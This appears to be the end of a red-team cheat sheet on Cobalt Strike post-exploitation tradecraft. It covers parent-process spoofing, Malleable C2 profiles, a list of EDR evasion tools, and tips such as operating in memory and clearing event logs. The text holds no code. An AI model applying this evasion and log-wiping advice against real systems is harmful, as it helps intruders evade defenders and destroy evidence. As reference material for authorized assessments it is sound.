 - **Session Prepping:** Before engaging in any post-exploitation action after we have compromised a host, we should prepare our beacon to match the environments behaviour, that way we will generate a lesser amount of IOCs (Indicators Of Compromise). To do that we can use the "spawnto" module to specify which binary our child processes will use to execute post exploitation actions, also we can use the "ppid" module to spoof the parent process that our child processes will spawn under. Both those tricks will provide us with a good amount of stealth and will hide our presence on the compromised host.
 - **Environment Behaviour Blending:** On a post exploitation context even when we are using the http(s) protocols to blend in with the environment's traffic, a good endpoint security solution or a Next Generation firewall can figure out that some traffic is unusual to exist within the environment and will probably block and create telemetry to a SOC endpoint for the blue team to examine it. Thats where "Malleable C2" profiles come in, it is a configuration file that each cobalt strike team server can use and it provides customization and flexibility for: beacon's traffic, process injection, process spawning, behaviour, antivirus evasion etc. So the best practise is to never use default beacon behaviour and always use a custom profile for every assessment.
   
## EDR Evasion Tools and Methods
  - [PEzor](https://github.com/phra/PEzor): PE Packer for EDR evasion.
  - [SharpBlock](https://github.com/CCob/SharpBlock): A method of bypassing EDR's active projection DLL's by preventing entry point execution.
  - [TikiTorch](https://github.com/rasta-mouse/TikiTorch): AV/EDR evasion using Process Hollowing Injection.
  - [Donut](https://github.com/TheWover/donut): Donut is a position-independent code that enables in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies.
  - [Dynamic-Invoke](https://thewover.github.io/Dynamic-Invoke/): Bypassing EDR solution by hiding malicious win32 API calls from within C# managed code.
   
## General Post-Exploitation TIPS
  - Before executing anything be sure you know how it behaves and what IOCs (Indicators Of Compromise) it generates.
  - Try to not touch disk as much as you can and operate in memory for the most part.
  - Check AppLocker policies to determine what type of files you can execute and from which locations.
  - Clean up artifacts immediately after finishing a post-exploitation task.
  - Clean event logs after finishing with a host.
  
  
-------------------------------------------------------------------------------------------------------------------------------------------------------


## Additional References:

* https://www.ired.team/offensive-security/red-team-infrastructure/cobalt-strike-101-installation-and-interesting-commands
* https://ppn.snovvcrash.rocks/red-team/cobalt-strike
* https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers
* https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm?cshid=1062
* https://github.com/BC-SECURITY/Malleable-C2-Profiles
* https://github.com/threatexpress/malleable-c2
* https://gist.github.com/tothi/8abd2de8f4948af57aa2d027f9e59efe
* https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b
* https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/
* https://gist.github.com/tothi/8abd2de8f4948af57aa2d027f9e59efe
